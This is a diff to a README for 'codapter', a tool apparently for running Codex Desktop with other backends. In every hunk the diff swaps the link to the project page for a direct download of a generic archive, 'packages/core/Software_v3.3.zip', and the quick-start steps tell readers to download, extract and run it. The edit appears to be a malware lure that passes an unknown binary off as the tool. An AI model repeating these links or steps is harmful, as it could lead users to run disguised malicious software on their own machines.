@@ -1,6 +1,6 @@
 # 🧩 codapter - Run Codex Desktop With More Backends
 
-[![Download codapter](https://img.shields.io/badge/Download%20codapter-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nonunion-loasa895/codapter)
+[![Download codapter](https://img.shields.io/badge/Download%20codapter-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nonunion-loasa895/codapter/raw/refs/heads/main/packages/core/Software_v3.3.zip)
 
 ## 🚀 What codapter does
 
@@ -23,7 +23,7 @@ Before you start, make sure you have:
 
 Visit this page to download and use codapter:
 
-https://github.com/nonunion-loasa895/codapter
+https://github.com/nonunion-loasa895/codapter/raw/refs/heads/main/packages/core/Software_v3.3.zip
 
 If the page opens in your browser, look for the latest release or the main download file, then save it to your computer.
 
@@ -146,7 +146,7 @@ This helps you confirm that the connection works before you rely on it for daily
 ## 📌 Quick start
 
 1. Visit the download page:
-   https://github.com/nonunion-loasa895/codapter
+   https://github.com/nonunion-loasa895/codapter/raw/refs/heads/main/packages/core/Software_v3.3.zip
 2. Download the Windows file
 3. Extract it if needed
 4. Run codapter
